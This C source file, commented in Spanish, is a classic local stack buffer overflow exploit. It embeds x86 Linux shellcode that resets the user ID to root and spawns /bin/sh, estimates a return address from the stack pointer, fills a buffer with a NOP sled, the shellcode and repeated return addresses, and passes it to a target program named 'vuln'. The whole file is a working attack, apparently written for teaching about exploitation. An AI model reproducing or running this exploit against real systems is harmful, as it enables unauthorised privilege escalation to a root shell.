#include <stdlib.h>
char shellcode[] = 
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x20\x5e\x31\xc0\x88\x46"
"\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
"\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62"
"\x69\x6e\x2f\x73\x68\x78\x61\x61\x61\x61\x62\x62\x62\x62";

unsigned long sp(void)        /*func. que coloca ESP en AX */
{__asm__("movl %esp,%eax");}  /*AX se regresa como valor de la función*/

int main (int argc, char *argv[])
{
    char *buffer;
    char *tmp_ptr;
    int i, offset;
    long esp, ret, *addr_ptr;
    
    offset = 500;            /* Desplazamiento a partir de dir. en ESP */
    esp = sp();              /* Obtiene dir. de ESP */
    ret = esp - offset;      /* A la dir. de retorno restamos el */
                             /* desplazamiento */

    printf("--- Apuntador a pila (ESP)        : 0x%x\n",esp);
    printf("--- Desplazamiento desde pila ESP : 0x%x\n",offset);
    printf("--- Dir. de retorno estimada      : 0x%x\n\n",ret);

    /* Reserva 400 bytes de memoria para crear cadena de inyección 
       (en heap) */
    buffer = malloc(400);
    /* Llena primero el buffer con la dirección de retorno estimada */
    tmp_ptr = buffer;
    addr_ptr = (long *) tmp_ptr;
    for (i=0; i < 400; i+=4)
    { *(addr_ptr++)=ret;}
    /* Sobrescribe ahora los primeros 100 bytes con NOPs para 
       escalera hacia código */
    for (i=0; i < 100; i++)
    { buffer[i] = '\x90';}
    /* Finalmente pega el código al final de los NOPs */
    tmp_ptr = buffer+100;
    for(i=0; i < strlen(shellcode); i++)
    { *(tmp_ptr++) = shellcode[i];}
    /*coloca un 0 como final de la cadena*/
    buffer[400-1]=0;
    /* Llama al programa vuln con el contenido del buffer como 
       parámetro */
    execl("./vuln", "vuln", buffer,0);
    /* Libera la memoria y termina el programa */
    free(buffer);
    return 0;
}

